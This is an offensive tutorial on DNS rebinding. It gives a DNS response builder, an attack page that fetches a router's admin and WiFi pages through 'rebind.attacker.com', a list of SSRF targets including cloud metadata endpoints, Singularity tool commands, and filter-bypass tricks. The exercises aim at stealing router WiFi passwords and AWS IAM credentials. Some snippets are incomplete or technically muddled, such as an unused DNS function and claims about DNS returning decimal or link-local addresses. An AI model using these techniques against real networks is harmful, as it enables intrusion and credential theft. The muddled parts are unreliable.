# DNS Rebinding Attack Guide

## Introduction

DNS rebinding is a technique that bypasses same-origin policy by manipulating DNS resolution to make a domain name resolve to an internal IP address after initial page load. This allows an attacker-controlled website to interact with services on the victim's internal network, effectively turning the browser into a proxy for attacking internal systems. This guide covers rebinding techniques, router/modem attacks, SSRF via rebinding, and anti-rebinding bypass methods.

## Practical Steps

### 1. DNS Rebinding Fundamentals

```bash
# Set up DNS rebinding with two A records (TTL=0)
# First resolution: attacker IP (for page load)
# Second resolution: target IP (127.0.0.1 or internal IP)

# Configure DNS server for rebinding
python3 -c "
import socket
import struct

def dns_rebinding_response(query_data, target_ip):
    '''Build DNS response that alternates between attacker and target IP.'''
    # Parse query
    tid = query_data[:2]
    flags = b'\\x81\\x80'  # Standard response
    qdcount = b'\\x00\\x01'
    ancount = b'\\x00\\x01'
    nscount = b'\\x00\\x00'
    arcount = b'\\x00\\x00'

    header = tid + flags + qdcount + ancount + nscount + arcount

    # Copy question section
    question = b''
    idx = 12
    while query_data[idx] != 0:
        length = query_data[idx]
        question += query_data[idx:idx+length+1]
        idx += length + 1
    question += b'\\x00'
    question += query_data[idx+1:idx+3]  # QTYPE
    question += query_data[idx+3:idx+5]  # QCLASS

    # Answer section with target IP
    answer = b'\\xc0\\x0c'  # Pointer to name
    answer += b'\\x00\\x01'  # TYPE A
    answer += b'\\x00\\x01'  # CLASS IN
    answer += b'\\x00\\x00\\x00\\x01'  # TTL = 1 second
    answer += b'\\x00\\x04'  # RDLENGTH

    # Convert IP to bytes
    ip_bytes = bytes(int(o) for o in target_ip.split('.'))
    answer += ip_bytes

    return header + question + answer

print('DNS rebinding server framework ready')
print('Configure: rebinding.example.com -> attacker_ip (first) / target_ip (second)')
"
```

### 2. Router and Modem Administration Attacks

```bash
# DNS rebinding to access router admin panel (typically 192.168.1.1)
# Step 1: Host malicious page that makes requests to rebinding domain

cat > rebinding_attack.html << 'EOF'
<script>
// Wait for DNS to rebind, then attack internal router
async function attackRouter() {
    // Initial request loads from attacker IP
    // Subsequent requests resolve to 192.168.1.1
    const target = 'http://rebind.attacker.com';

    // Try to access router admin panel
    try {
        const resp = await fetch(target + '/cgi-bin/luci/admin/status/overview', {
            credentials: 'include'
        });
        const html = await resp.text();
        console.log('Router page accessed:', html.substring(0, 200));
    } catch(e) {
        console.log('Error:', e.message);
    }

    // Extract CSRF token and change DNS settings
    try {
        const resp = await fetch(target + '/cgi-bin/luci/admin/network/wifi', {
            credentials: 'include'
        });
        const html = await resp.text();
        console.log('WiFi config page:', html.substring(0, 200));
    } catch(e) {
        console.log('Error:', e.message);
    }
}

// Delay to allow DNS rebinding (TTL expires)
setTimeout(attackRouter, 2000);
</script>
EOF

# Host the page on attacker web server
python3 -m http.server 80
```

### 3. SSRF via DNS Rebinding

```bash
# Bypass SSRF protection that validates first request
# The server resolves the domain, gets attacker IP (passes validation)
# Server makes request again, gets internal IP (bypasses filter)

# Common internal targets via rebinding
python3 -c "
targets = {
    'AWS Metadata': '169.254.169.254',
    'GCP Metadata': 'metadata.google.internal',
    'Azure Metadata': '169.254.169.254',
    'Kubernetes API': '10.0.0.1:443',
    'Docker API': '172.17.0.1:2375',
    'Redis': '127.0.0.1:6379',
    'Elasticsearch': '127.0.0.1:9200',
    'Prometheus': '127.0.0.1:9090',
}

for name, addr in targets.items():
    print(f'{name}: {addr}')
    print(f'  curl http://rebind.attacker.com/ -> resolves to {addr}')
"
```

### 4. Using singularity for DNS Rebinding

```bash
# Install singularity DNS rebinding tool
# git clone https://github.com/nccgroup/singularity

# Start singularity DNS server
python3 singularity.py --dns-port 53 --http-port 80 --cmd-port 4443

# Configure payloads for rebinding attack
# 1. Create DNS rebinding rule
curl -X POST http://localhost:4443/api/dns/rebinding \
  -d '{"domain":"rebind.attacker.com","target_ip":"127.0.0.1","attacker_ip":"YOUR_IP"}'

# 2. Create HTTP payload for internal scanning
curl -X POST http://localhost:4443/api/http/payload \
  -d '{"url":"/admin","method":"GET","headers":{}}'

# Monitor results
curl http://localhost:4443/api/http/results
```

### 5. Anti-Rebinding Bypass Techniques

```bash
# Some servers block private IP DNS responses
# Bypass techniques:

# Technique 1: Use non-standard DNS resolution
# Many apps use system resolver which may accept private IPs

# Technique 2: IPv6 link-local addresses
# fe80::1 is often not filtered
curl -X POST http://target.com/fetch \
  -d '{"url":"http://rebind.attacker.com/"}'
# DNS resolves to fe80::1 after first request

# Technique 3: Decimal IP encoding
# 127.0.0.1 = 2130706433
# Configure DNS to return 2130706433 as IP
curl http://2130706433:8080/

# Technique 4: Using wildcard DNS with time-based rebinding
python3 -c "
# Configure DNS server to alternate responses
# based on query count or time
import time
target_ips = ['ATTACKER_IP', '127.0.0.1', 'ATTACKER_IP', '169.254.169.254']
query_count = 0

def get_next_ip():
    global query_count
    ip = target_ips[query_count % len(target_ips)]
    query_count += 1
    return ip

for i in range(8):
    print(f'  Query {i+1}: {get_next_ip()}')
    time.sleep(0.5)
"
```

## Hands-on Exercises

### Exercise 1: Router Admin Access via Rebinding

Set up a DNS rebinding attack against a simulated router admin panel at 192.168.1.1. Use a browser to load the attacker page, wait for DNS rebinding, and extract the router's WiFi password.

### Exercise 2: Cloud Metadata Extraction

Using DNS rebinding, bypass an SSRF filter that validates domain resolution. Extract AWS IAM credentials from the metadata service at 169.254.169.254.

## References

- DNS Rebinding — https://en.wikipedia.org/wiki/DNS_rebinding
- Singularity DNS Rebinding Tool — https://github.com/nccgroup/singularity
- OWASP SSRF Guide — https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- RFC 1918 (Private Address Space) — https://tools.ietf.org/html/rfc1918
